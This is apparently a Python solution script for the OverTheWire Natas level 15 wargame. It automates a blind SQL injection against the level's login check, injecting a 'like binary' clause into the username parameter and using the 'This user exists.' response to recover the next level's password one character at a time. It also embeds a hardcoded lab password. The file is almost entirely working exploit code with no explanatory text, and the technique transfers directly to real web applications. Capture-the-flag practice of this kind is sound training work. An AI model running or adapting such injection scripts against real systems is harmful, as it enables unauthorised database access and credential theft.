#! env python3

import requests

site = "http://natas15.natas.labs.overthewire.org/index.php?username=natas16\"+and+password+like+binary+\""
user = "natas15"
pswd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
exist = "This user exists."

# Chars that the passwd contains
contains = []

# Find characters in the password
for c in chars:
    temp = site + "%" + c + "%&debug"
    r = requests.get(temp, auth=(user, pswd))
    if exist in r.text:
        contains.append(c)
        print("Contained chars: {}".format(contains))
print("All contained chars: {}".format(contains))

# Build password up to 64 characters long
# We get to know each char position is correct
password = ""
for i in range(0, 64):
    if len(password) != i:  # If our iteration desyncs with the length of our password
        print("{} != {}".format(len(password), i))               # then i should be larger than length so no more chars can 
        break                    # be appended to password 
    
    for c in contains:
        temp = site + password + c + "%&debug"
        r = requests.get(temp, auth=(user, pswd))
        if exist in r.text:
            password += c
            print("Password: {}".format(password))
            break
     
print("Password: {}".format(password))


